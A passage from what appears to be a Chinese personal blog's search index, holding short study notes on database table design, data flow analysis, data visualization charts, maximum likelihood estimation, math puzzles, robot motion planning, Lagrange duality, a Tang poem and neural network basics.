&#96;create_time&#96; datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT &#39;创建时间&#39;,</span><br><span class="line">  &#96;update_time&#96; datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT &#39;更新时间&#39;,</span><br><span class="line">  &#96;version&#96; int(8) NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;乐观锁版本号&#39;,</span><br><span class="line">  PRIMARY KEY (&#96;id&#96;),</span><br><span class="line">  UNIQUE KEY &#96;dict_code_category_code&#96; (&#96;dict_code&#96;,&#96;category_code&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8 COMMENT&#x3D;&#39;通用数据字典&#39;;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://github.com/Jessicahust/translation/blob/master/tiemao_2016/03_dict_table_design/03_dict_table_design.md" target="_blank" rel="noopener">通用数据字典表结构设计</a>,by Jessicahust.</li>
<li><a href="https://blog.csdn.net/weixin_43180484/article/details/109527556" target="_blank" rel="noopener">数据库设计之数据字典的使用与设计</a>,by 沉默终止.</li>
<li><a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%AD%97%E5%85%B8/1270246" target="_blank" rel="noopener">数据字典</a>,by baidu.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>数据流分析</title>
    <url>/2021/03/29/%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>数据流分析 是一种用于收集计算机程序在不同点计算的值的信息的技术。</p>
<h1 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h1><p>数据流分析试图获得程序中每一点的特定信息。通常，在基本块的界限内就可以获得这些信息，因为很容易计算基本块中的信息。在前向流分析(forward flow analysis)中，一个块的结束状态是这个块起始状态的一个函数。函数由块内的语句的影响信息组成。一个块的开始状态是它的前驱的结束状态的函数。这就产生了一系列的数据流方程：</p>
<p>对于每一个块$b:$</p>
<p>$$ out_b = trans_{b}(in_b) $$<br>$$ in_b = join_{p \in pred_b}(out_p) $$</p>
<p>在这里，$trans_b$ 是块 $b$ 的 转移函数。它作用于入口状态$in_b$，并产生出口状态$out_b$。连接运算符 $join$ 将块 $b$ 的前驱节点 $p \in pred_b$ 的出口状态联合起来，产生入口状态 $b$。</p>
<p>在求解这一系列方程之后，块的入口和出口状态可以被用来获得程序在块内的属性。每条语句的转移函数可以被分别的用于获得在一个基本块内的某一点的信息。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90" target="_blank" rel="noopener">数据流分析</a>,by wikipedia.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>新版Chrome对JavaScript的Array.sort()不支持</title>
    <url>/2022/12/20/%E6%96%B0%E7%89%88Chrome%E5%AF%B9JavaScript%E7%9A%84Array-sort-%E4%B8%8D%E6%94%AF%E6%8C%81/</url>
    <content><![CDATA[<p>碰到一个JavaScript的Array.sort函数排序失败的奇怪问题，具体解决方案请参考<a href="https://support.google.com/chrome/thread/3552198/%E6%96%B0%E7%89%88chrome%E5%AF%B9javascript%E7%9A%84array-sort-%E4%B8%8D%E6%94%AF%E6%8C%81?hl=en" target="_blank" rel="noopener">新版Chrome对JavaScript的Array.sort()不支持</a>。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://support.google.com/chrome/thread/3552198/%E6%96%B0%E7%89%88chrome%E5%AF%B9javascript%E7%9A%84array-sort-%E4%B8%8D%E6%94%AF%E6%8C%81?hl=en" target="_blank" rel="noopener">新版Chrome对JavaScript的Array.sort()不支持</a>,by chrome.</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/sort" target="_blank" rel="noopener">Array.prototype.sort()</a>,by mozilla.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>数据可视化之二维图形</title>
    <url>/2020/07/31/%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96%E4%B9%8B%E4%BA%8C%E7%BB%B4%E5%9B%BE%E5%BD%A2/</url>
    <content><![CDATA[<p>“有图有真相”、“一图抵千言”，这些俗语充分体现了大数据时代图的重要性。与枯燥的数据相比，丰富多样的图形更能揭示数据背后的规律，更受普罗大众的欢迎。因此有必要了解和熟悉一些常用的图，以便根据数据选择合适的图形表示。</p>
<h1 id="弦图-Chord-Diagram"><a href="#弦图-Chord-Diagram" class="headerlink" title="弦图 (Chord Diagram)"></a>弦图 (Chord Diagram)</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>弦图 (Chord Diagram) 可以显示不同实体之间的相互关系和彼此共享的一些共通之处，因此这种图表非常适合用来比较数据集或不同数据组之间的相似性。</p>
<p>节点围绕着圆周分布，点与点之间以弧线或贝塞尔曲线彼此连接以显示当中关系，然后再给每个连接分配数值（通过每个圆弧的大小比例表示）。此外，也可以用颜色将数据分成不同类别，有助于进行比较和区分。</p>
<p>弦图的缺点是过于混乱，尤其是当要显示太多连接的时候。</p>
<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ul>
<li>比较</li>
<li>关系</li>
</ul>
<h1 id="旭日图"><a href="#旭日图" class="headerlink" title="旭日图"></a>旭日图</h1><h2 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h2><p>也称为「多层饼形图」或「径向树图」。</p>
<p>这种图表通过一系列的圆环显示层次结构，再按不同类别节点进行切割。每个圆环代表层次结构中的一个级别，中心圆表示根节点，层次结构从这点往外推移。</p>
<p>之后圆环会按照其与原属切片的层次关系再被分割，分割角度可以是均等平分，或者与某个数值成比例。</p>
<p>我们也可以用不同颜色突出显示层次分组或特定类别。</p>
<h2 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h2><ul>
<li>层次结构</li>
<li>部分对整体</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>1.<a href="https://datavizcatalogue.com/ZH/index.html" target="_blank" rel="noopener">数据可视化工具目录</a>,by datavizcatalogue.</p>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机图形学</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库表主键设计方法</title>
    <url>/2019/09/20/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E4%B8%BB%E9%94%AE%E8%AE%BE%E8%AE%A1%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>数据库表主键使用自增整型字段还是使用GUID字段，这是一个问题。下面详细分析它们的优劣。</p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="数据库设计范式"><a href="#数据库设计范式" class="headerlink" title="数据库设计范式"></a>数据库设计范式</h2><ul>
<li><p>第一范式（1NF）：强调的是列的原子性，即列不能够再分成其他几列。简而言之，第一范式就是无重复的列</p>
</li>
<li><p>第二范式（2NF）：首先要满足它是1NF，另外还需要包含两部分内容：一是表必须有一个主键；二是没有包含在主键中的列必须完全依赖于主键，而不能只依赖于主键的一部分。简而言之，第二范式就是非主属性非部分依赖于主关键字</p>
</li>
<li><p>第三范式（3NF）：首先是 2NF，另外非主键列必须直接依赖于主键，不能存在传递依赖。即不能存在：非主键列 A 依赖于非主键列 B，非主键列 B 依赖于主键的情况。简而言之，第三范式（3NF）要求一个数据库表中不包含已在其它表中已包含的非主关键字信息。</p>
</li>
</ul>
<h2 id="反范式主键的设计原则"><a href="#反范式主键的设计原则" class="headerlink" title="反范式主键的设计原则"></a>反范式主键的设计原则</h2><ul>
<li>主键应当是对用户没有意义的。业务上的‘主键’可以通过唯一键（Unique Key）或唯一索引（Unique Index）和其它约束条件实现</li>
<li>主键应该是单列的，以便提高连接和筛选操作的效率</li>
<li>不要更新主键。实际上，因为主键除了惟一地标识一行之外再没有其他的用途了，所以也就没有理由去对它更新。</li>
<li>主键不应包含动态变化的数据，如时间戳、创建时间列、修改时间列等</li>
<li>主键应当由计算机自动生成。</li>
</ul>
<h1 id="数据库表主键设计方法"><a href="#数据库表主键设计方法" class="headerlink" title="数据库表主键设计方法"></a>数据库表主键设计方法</h1><p>数据库表主键设计主要有自增整型字段和使用GUID字段两种方法。</p>
<h2 id="自增整型字段作为主键"><a href="#自增整型字段作为主键" class="headerlink" title="自增整型字段作为主键"></a>自增整型字段作为主键</h2><p>最常用的主键设计方法。例如《阿里 Java 开发手册》中规定有以下 MySQL 建表规约：</p>
<blockquote>
<p>表必备三字段：id, gmt_create, gmt_modified。 说明：其中id必为主键，类型为unsigned bigint、单表时自增、步长为1。gmt_create, gmt_modified的类型均为date_time类型。</p>
</blockquote>
<p>该方法优点是：数据库自动编号，速度快，而且是增量增长，聚集型主键按顺序存放，对于检索非常有利;数字型的，占用空间小，易排序，在程序中传递也方便;如果通过非系统增加记录(比如手动录入，或是用其他工具直接在表里插入新记录，或老系统数据导入)时，非常方便，不用担心主键重复问题。</p>
<p>该方法缺点是：因为自动增长，在手动要插入指定ID的记录时会显得麻烦，尤其是当系统与其他系统集成时，需要数据导入时，很难保证原系统的ID不发生主键冲突。</p>
<h2 id="GUID字符串作为主键"><a href="#GUID字符串作为主键" class="headerlink" title="GUID字符串作为主键"></a>GUID字符串作为主键</h2><p>Guid:指在一台机器上生成的数字，它保证对在同一时空中的所有机器都是唯一的，其算法是通过以太网卡地址、纳秒级时间、芯片ID码和许多可能的数字生成。其格式为:04755396-9A29-4B8C-A38D-00042C1B9028。</p>
<p>GUID字符串作为主键的优点如下：</p>
<ul>
<li><p>在扩展数据库的时候，当你有多个数据库包含同一段（片）数据时，比如一个顾客集，使用 GUID 意味着该 ID 在所有的数据库中是唯一标识的，而不是仅仅本数据库唯一。这保障了跨数据库迁移数据的安全。又比如，我曾在项目中把多个数据库分片合并到一个 Hadoop 集群中，也没有产生键的冲突。</p>
</li>
<li><p>在插入数据之前，你就能知道这个主键的值，这避免了一轮的数据查找，并且简化了事务的逻辑，即在你插入子记录之前，因为需要使用这个主键作为一个外键，你必须要知道这个主键的值。</p>
</li>
<li><p>GUID 不会透露数据的信息，因此被用在 URL 中也比自增整数更安全。比如，我是编号 12345678 号顾客，那么人们就会猜测编号为 12345677 和 12345679 的顾客的存在，这就提供了一种攻击向量。（但是后面我们会看到一个更好的替代品）</p>
</li>
</ul>
<p>GUID字符串作为主键的缺点如下：</p>
<ul>
<li>GUID 值较长，不容易记忆和输入，而且这个值是随机、无顺序的。</li>
<li>GUID 的值有 16 个字节，与其它那些诸如 4 字节的整数相比要相对大一些。这意味着如果在数据库中使用 uniqueidentifier 键，可能会带来两方面的消极影响：存储空间增大;索引时间较慢。</li>
</ul>
<h1 id="主流数据库中GUID实现"><a href="#主流数据库中GUID实现" class="headerlink" title="主流数据库中GUID实现"></a>主流数据库中GUID实现</h1><h2 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h2><p>在MS Sql 数据库中可以在建立表结构是指定字段类型为uniqueidentifier,并且其默认值可以使用NewID()来生成唯一的Guid(全局唯一标识符).</p>
<p>使用NewID生成的比较随机,如果是SQL 2005可以使用NewSequentialid()来顺序生成,在此为了兼顾使用SQL 2000使用了NewID().</p>
<h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><p>MySQL中使用UUID()函数生成主键，UUID()函数将生成格式为xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx (8-4-4-4-12)的字符串，包含32个16进制数字，以连字号分为五段。示例：550e8400-e29b-41d4-a716-446655440000。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/kleguan/article/details/74502330" target="_blank" rel="noopener">数据库表主键设计原则</a>,by 乐哉悠哉.</li>
<li><a href="https://blog.csdn.net/linzhiqiang0316/article/details/52881151" target="_blank" rel="noopener">[MySQL]数据库主键设计之思考</a>,by 林老师带你学编程.</li>
<li><a href="http://www.nowamagic.net/librarys/veda/detail/383" target="_blank" rel="noopener">如何设计数据库的主键</a>,by Veda 原型.</li>
<li><a href="https://juejin.im/post/59561e5b6fb9a06bbf6fdf16" target="_blank" rel="noopener">[译] 把 UUID 或者 GUID 作为主键？你得小心啦！</a>,by zaraguo.</li>
<li><a href="https://blog.csdn.net/shiyong1949/article/details/78411509" target="_blank" rel="noopener">MySQL中使用UUID()函数生成主键</a>,by shiyonghm.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>最大似然估计</title>
    <url>/2022/02/22/%E6%9C%80%E5%A4%A7%E4%BC%BC%E7%84%B6%E4%BC%B0%E8%AE%A1/</url>
    <content><![CDATA[<p>在统计学中，最大似然估计（英语：Maximum Likelihood Estimation，简作MLE），也称极大似然估计，是用来估计一个概率模型的参数的一种方法。</p>
<p>$$ \begin{aligned} \ln p(x_i|\mu,\sigma) = \ln \frac{1}{\sqrt{2\pi} \sigma} \exp \left{ - \frac{(x_i-\mu)^2}{2\sigma^2} \right} \ = \left{ - \frac{(x_i-\mu)^2}{2\sigma^2} - \ln \sigma - \ln \sqrt{2\pi} \right} \end{aligned} ​$$</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/%E6%9C%80%E5%A4%A7%E4%BC%BC%E7%84%B6%E4%BC%B0%E8%AE%A1" target="_blank" rel="noopener">最大似然估计</a>,by wikipedia.</li>
<li><a href="https://zhuanlan.zhihu.com/p/26614750" target="_blank" rel="noopener">一文搞懂极大似然估计</a>,by 忆臻.</li>
<li><a href="https://blog.csdn.net/raby_gyl/article/details/73477043" target="_blank" rel="noopener">高斯分布微分熵的推导</a>,by 机器学习的小学生.</li>
<li><a href="https://blog.csdn.net/Yemiekai/article/details/116797878" target="_blank" rel="noopener">高斯分布的极大似然估计</a>,by Yemiekai.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>统计学</tag>
      </tags>
  </entry>
  <entry>
    <title>有趣的数学游戏</title>
    <url>/2019/06/23/%E6%9C%89%E8%B6%A3%E7%9A%84%E6%95%B0%E5%AD%A6%E6%B8%B8%E6%88%8F/</url>
    <content><![CDATA[<p>记录一些有趣的数学游戏，与小伙伴分享。</p>
<h1 id="三门问题"><a href="#三门问题" class="headerlink" title="三门问题"></a>三门问题</h1><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>三门问题（Monty Hall problem）亦称为蒙提霍尔问题、蒙特霍问题或蒙提霍尔悖论，大致出自美国的电视游戏节目Let’s Make a Deal。</p>
<p>问题名字来自该节目的主持人蒙提·霍尔（Monty Hall）。参赛者会看见三扇关闭了的门，其中一扇的后面有一辆汽车，选中后面有车的那扇门可赢得该汽车，另外两扇门后面则各藏有一只山羊。当参赛者选定了一扇门，但未去开启它的时候，节目主持人开启剩下两扇门的其中一扇，露出其中一只山羊。主持人其后会问参赛者要不要换另一扇仍然关上的门。问题是：换另一扇门会否增加参赛者赢得汽车的机率？</p>
<h2 id="问题解答"><a href="#问题解答" class="headerlink" title="问题解答"></a>问题解答</h2><p><a href="https://zhuanlan.zhihu.com/p/70217002" target="_blank" rel="noopener">漫画：反直觉的 “三门问题”</a></p>
<h1 id="海盗分金币问题"><a href="#海盗分金币问题" class="headerlink" title="海盗分金币问题"></a>海盗分金币问题</h1><h2 id="问题描述-1"><a href="#问题描述-1" class="headerlink" title="问题描述"></a>问题描述</h2><p>经济学上有个“海盗分金”模型：是说5个海盗抢得100枚金币，他们按抽签的顺序依次提方案：首先由1号提出分配方案，然后5人表决，投票要超过半数同意方案才被通过，否则他将被扔入大海喂鲨鱼，依此类推。</p>
<p>“海盗分金”其实是一个高度简化和抽象的模型，体现了博弈的思想。在“海盗分金”模型中，任何“分配者”想让自己的方案获得通过的关键是事先考虑清楚“挑战者”的分配方案是什么，并用最小的代价获取最大收益，拉拢“挑战者”分配方案中最不得意的人们。</p>
<h2 id="问题解答-1"><a href="#问题解答-1" class="headerlink" title="问题解答"></a>问题解答</h2><p><a href="https://zhuanlan.zhihu.com/p/55273946" target="_blank" rel="noopener">漫画：有趣的海盗问题</a></p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/70217002" target="_blank" rel="noopener">漫画：反直觉的 “三门问题”</a>,by 小灰.</li>
<li><a href="https://zhuanlan.zhihu.com/p/55273946" target="_blank" rel="noopener">漫画：有趣的海盗问题</a>,by 小灰.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>游戏</tag>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title>机器人路径规划、轨迹规划和运动规划概念辨析</title>
    <url>/2019/04/17/%E6%9C%BA%E5%99%A8%E4%BA%BA%E8%B7%AF%E5%BE%84%E8%A7%84%E5%88%92-%E8%BD%A8%E8%BF%B9%E8%A7%84%E5%88%92%E5%92%8C%E8%BF%90%E5%8A%A8%E8%A7%84%E5%88%92%E6%A6%82%E5%BF%B5%E8%BE%A8%E6%9E%90/</url>
    <content><![CDATA[<p>在机器人自动控制研究中，路径规划、轨迹规划和运动规划三个概念总是混淆不清，难以捉摸。下面结合各种资料，给出我个人的一些理解，对这三个概念进行辨析。</p>
<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><h2 id="路径规划（path-planning）"><a href="#路径规划（path-planning）" class="headerlink" title="路径规划（path planning）"></a>路径规划（path planning）</h2><p>路径是机器人位姿的一定序列，<strong>不考虑机器人位姿参数随时间变化的因素</strong>。路径规划（一般指位置规划）是找到一系列要经过的路径点，路径点是空间中的位置或关节角度。</p>
<h2 id="轨迹规划（trajectory-planning）"><a href="#轨迹规划（trajectory-planning）" class="headerlink" title="轨迹规划（trajectory planning）"></a>轨迹规划（trajectory planning）</h2><p>路径是机器人位姿的一定序列，<strong>不考虑机器人位姿参数随时间变化的因素</strong>。路径规划（一般指位置规划）是找到一系列要经过的路径点，路径点是空间中的位置或关节角度，而轨迹规划是赋予路径时间信息。</p>
<h2 id="运动规划（motion-planning）"><a href="#运动规划（motion-planning）" class="headerlink" title="运动规划（motion planning）"></a>运动规划（motion planning）</h2><p>运动规划就是在给定的位置A与位置B之间为机器人找到一条符合约束条件的路径。运动规划包含路径规划和轨迹规划。</p>
<p>运动规划，又称运动插补，是在给定的路径端点之间插入用于控制的中间点序列从而实现沿给定的平稳运动。</p>
<p>运动控制则是主要解决如何控制目标系统准确跟踪指令轨迹的问题，即对于给定的指令轨迹，选择适合的控制算法和参数，产生输出，控制目标实时，准确地跟踪给定的指令轨迹。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/wdzeng/p/9159575.html" target="_blank" rel="noopener">运动（motion）规划、路径（path）规划和轨迹（trajectory）规划之区别</a>,by Roger_Ceng.</li>
<li><a href="https://blog.csdn.net/wx545644217/article/details/54175035" target="_blank" rel="noopener">运动规划/路径规划/轨迹规划</a>,by 小白鼠2号.</li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA5MDE2MjQ0OQ==&mid=2652786406&idx=1&sn=f937dd6aa91344fed689baf51dc821ab#rd" target="_blank" rel="noopener">运动规划 | 简介篇</a>,by qqfly.</li>
<li><a href="https://www.zhihu.com/question/67867008" target="_blank" rel="noopener">无人车运动规划，路径规划，轨迹规划的区别和联系？</a>, by zhihu.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>对偶问题转化</title>
    <url>/2022/02/23/%E5%AF%B9%E5%81%B6%E9%97%AE%E9%A2%98%E8%BD%AC%E5%8C%96/</url>
    <content><![CDATA[<p>在一个优化问题中，原始问题通常会带有很多约束条件，这样直接求解原始问题往往是很困难的，于是考虑将原始问题转化为它的对偶问题，通过求解它的对偶问题来得到原始问题的解。对偶性（Duality）是凸优化问题的核心内容。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/qq_43657442/article/details/106074037" target="_blank" rel="noopener">线性规划原问题对偶问题之间的转化，一张图带你理解</a>,by 中南自动化学院“智能控制与优化决策“至渝.</li>
<li><a href="https://www.cnblogs.com/90zeng/p/Lagrange_duality.html" target="_blank" rel="noopener">简易解说拉格朗日对偶（Lagrange duality）</a>,by 90Zeng.</li>
<li><a href="https://zhuanlan.zhihu.com/p/38182879" target="_blank" rel="noopener">拉格朗日对偶性</a>,by Eureka.</li>
<li><a href="https://zhuanlan.zhihu.com/p/103961917" target="_blank" rel="noopener">【凸优化笔记6】-拉格朗日对偶（Lagrange duality）、KKT条件</a>,by Lauer.</li>
<li><a href="https://blog.csdn.net/asd136912/article/details/79149881" target="_blank" rel="noopener">拉格朗日对偶性(Lagrance duality) 推导与简单理解</a>,by 小鹅鹅.</li>
<li><a href="https://www.jianshu.com/p/bc16f32960f8" target="_blank" rel="noopener">拉格朗日对偶性</a>,by 井底蛙蛙呱呱呱.</li>
<li><a href="https://frostime.github.io/2019/05/15/%E6%8B%89%E6%A0%BC%E6%9C%97%E6%97%A5%E5%AF%B9%E5%81%B6/" target="_blank" rel="noopener">拉格朗日对偶</a>,by Frostime.</li>
<li><a href="http://zuzhiang.cn/2019/11/27/primal-dual/" target="_blank" rel="noopener">优化方法：原问题和拉格朗日对偶问题（primal-dual）</a>,by 俎志昂.</li>
<li><a href="https://codeantenna.com/a/j9P5e8tHGw" target="_blank" rel="noopener">拉格朗日对偶详解</a>,by CodeAntenna.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title>春江花月夜</title>
    <url>/2018/06/09/%E6%98%A5%E6%B1%9F%E8%8A%B1%E6%9C%88%E5%A4%9C/</url>
    <content><![CDATA[<center>
作者：张若虚
春江潮水连海平，海上明月共潮生。
滟滟随波千万里，何处春江无月明？
江流宛转绕芳甸，月照花林皆似霰。
空里流霜不觉飞，汀上白沙看不见。
江天一色无纤尘，皎皎空中孤月轮。
江畔何人初见月，江月何年初照人？
人生代代无穷已，江月年年祇相似。
不知江月待何人？但见长江送流水。
白云一片去悠悠，青枫浦上不胜愁。
谁家今夜扁舟子，何处相思明月楼？
可怜楼上月徘徊，应照离人妆镜台。
玉户帘中卷不去，捣衣砧上拂还来。
此时相望不相闻，愿逐月华流照君。
鸿雁长飞光不度，鱼龙潜跃水成文。
昨夜闲潭梦落花，可怜春半不还家。
江水流春去欲尽，江潭落月复西斜。
斜月沉沉藏海雾，碣石潇湘无限路。
不知乘月几人归，落月摇情满江树。
</center>]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>唐诗</tag>
      </tags>
  </entry>
  <entry>
    <title>机器学习之神经网络</title>
    <url>/2018/11/20/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/</url>
    <content><![CDATA[<p>人工神经网络（英语：Artificial Neural Network，ANN），简称神经网络（Neural Network，NN）或类神经网络，在机器学习和认知科学领域，是一种模仿生物神经网络（动物的中枢神经系统，特别是大脑）的结构和功能的数学模型或计算模型，用于对函数进行估计或近似。</p>
<p>神经网络由大量的人工神经元联结进行计算。大多数情况下人工神经网络能在外界信息的基础上改变内部结构，是一种自适应系统，通俗的讲就是具备学习功能。<strong>现代神经网络是一种非线性统计性数据建模工具</strong>。</p>
<h1 id="神经元"><a href="#神经元" class="headerlink" title="神经元"></a>神经元</h1><p>神经元示意图：</p>
<p align="center">
    <img src="images/Ncell.png" width="90%" alt="神经元示意图"/>
</p>
<center>图1 神经元示意图</center>

<ul>
<li>a1~an为输入向量的各个分量</li>
<li>w1~wn为神经元各个突触的权值</li>
<li>b为偏置</li>
<li>f为传递函数，通常为非线性函数。一般有Sigmoid(), ReLU(), Softmax()。</li>
<li>t为神经元输出</li>
</ul>
<p>神经元的数学表示是：$t=f(\vec{W^{‘}}\vec{A}+b)$</p>
<ul>
<li>$\vec{W}$为权向量，$\vec{W^{‘}}$为$\vec{W}$的转置</li>
<li>$\vec{A}$为输入向量</li>
<li>$b$为偏置</li>
<li>$f$为传递函数</li>
</ul>
<p>可见，一个神经元的功能是求得输入向量与权向量的内积后，经一个非线性传递函数得到一个标量结果。</p>
<h2 id="激活函数"><a href="#激活函数" class="headerlink" title="激活函数"></a>激活函数</h2><ul>
<li>Sigmoid函数</li>
</ul>
<p>Sigmoid函数也称S型激活函数，其将加权和转换为介于 0 和 1 之间的值。<br>$$F(x)=\frac{1} {1+e^{-x}}$$</p>
<p>曲线图如下：</p>
<p align="center">
    <img src="images/sigmoid.svg" width="90%" alt="S 型激活函数"/>
</p>
<center>图2 S 型激活函数</center>

<ul>
<li>ReLU函数</li>
</ul>
<p>相较于 S 型函数等平滑函数，以下修正线性单元激活函数（简称为 ReLU）的效果通常要好一点，同时还非常易于计算。</p>
<p>$$F(x)=max(0,x)$$</p>
<p>ReLU 的优势在于它基于实证发现（可能由 ReLU 驱动），拥有更实用的响应范围。S 型函数的响应性在两端相对较快地减少。</p>
<p align="center">
    <img src="images/relu.svg" width="90%" alt="ReLU 激活函数"/>
</p>
<center>图3 ReLU 激活函数</center>

<ul>
<li>Softmax函数</li>
</ul>
<p>Softmax函数用于多类别神经网络。在多类别问题中，Softmax 会为每个类别分配一个用小数表示的概率。这些用小数表示的概率相加之和必须是 1.0。</p>
<p>Softmax 方程式如下所示：<br>$$p(y = j|\textbf{x})  = \frac{e^{(\textbf{w}<em>j^{T}\textbf{x} + b_j)}}{\sum</em>{k\in K} {e^{(\textbf{w}_k^{T}\textbf{x} + b_k)}} }$$</p>
<p>请注意，此公式本质上是将逻辑回归公式延伸到了多类别。</p>
<p>Softmax 层是紧挨着输出层之前的神经网络层。Softmax 层必须和输出层拥有一样的节点数。</p>
<p align="center">
    <img src="images/SoftmaxLayer.svg" width="90%" alt="神经网络中的 Softmax 层"/>
</p>
<center>图4 神经网络中的 Softmax 层</center>

<h1 id="神经元网络"><a href="#神经元网络" class="headerlink" title="神经元网络"></a>神经元网络</h1><p>神经元网络可分为单层神经元网络和多层神经元网络。而常用的是多层神经元网络。</p>
<h2 id="多层神经元网络"><a href="#多层神经元网络" class="headerlink" title="多层神经元网络"></a>多层神经元网络</h2><p>一种常见的多层结构的前馈网络（Multilayer Feedforward Network）由三部分组成，如图2所示：</p>
<p align="center">
    <img src="images/activation.svg" width="90%" alt="包含激活函数的三层模型的图表"/>
</p>
<center>图5 包含激活函数的三层模型的图表</center>

<ul>
<li>输入层（Input layer），众多神经元（Neuron）接受大量非线形输入消息。输入的消息称为输入向量。</li>
<li>输出层（Output layer），消息在神经元链接中传输、分析、权衡，形成输出结果。输出的消息称为输出向量。</li>
<li>隐藏层（Hidden layer），简称“隐层”，是输入层和输出层之间众多神经元和链接组成的各个层面。隐层可以有一层或多层。隐层的节点（神经元）数目不定，但数目越多神经网络的非线性越显著，从而神经网络的强健性（robustness）（控制系统在一定结构、大小等的参数摄动下，维持某些性能的特性）更显著。习惯上会选输入节点1.2至1.5倍的节点。</li>
</ul>
<p>这种网络一般称为感知器（对单隐藏层）或多层感知器（对多隐藏层），神经网络的类型已经演变出很多种，这种分层的结构也并不是对所有的神经网络都适用。</p>
<h2 id="训练神经网络"><a href="#训练神经网络" class="headerlink" title="训练神经网络"></a>训练神经网络</h2><p>通常使用反向传播算法训练神经网络<sup>[3]</sup>，但一些常见情况都会导致反向传播算法出错。</p>
<ul>
<li>梯度消失</li>
</ul>
<p>较低层（更接近输入）的梯度可能会变得非常小。在深度网络中，计算这些梯度时，可能涉及许多小项的乘积。</p>
<p>当较低层的梯度逐渐消失到 0 时，这些层的训练速度会非常缓慢，甚至不再训练。</p>
<p>ReLU 激活函数有助于防止梯度消失。</p>
<ul>
<li>梯度爆炸</li>
</ul>
<p>如果网络中的权重过大，则较低层的梯度会涉及许多大项的乘积。在这种情况下，梯度就会爆炸：梯度过大导致难以收敛。</p>
<p>批标准化可以降低学习速率，因而有助于防止梯度爆炸。</p>
<ul>
<li>ReLU 单元消失</li>
</ul>
<p>一旦 ReLU 单元的加权和低于 0，ReLU 单元就可能会停滞。它会输出对网络输出没有任何贡献的 0 激活，而梯度在反向传播算法期间将无法再从中流过。由于梯度的来源被切断，ReLU 的输入可能无法作出足够的改变来使加权和恢复到 0 以上。</p>
<p>降低学习速率有助于防止 ReLU 单元消失。</p>
<ul>
<li>丢弃正则化</li>
</ul>
<p>这是称为丢弃的另一种形式的正则化，可用于神经网络。其工作原理是，在梯度下降法的每一步中随机丢弃一些网络单元。丢弃得越多，正则化效果就越强。</p>
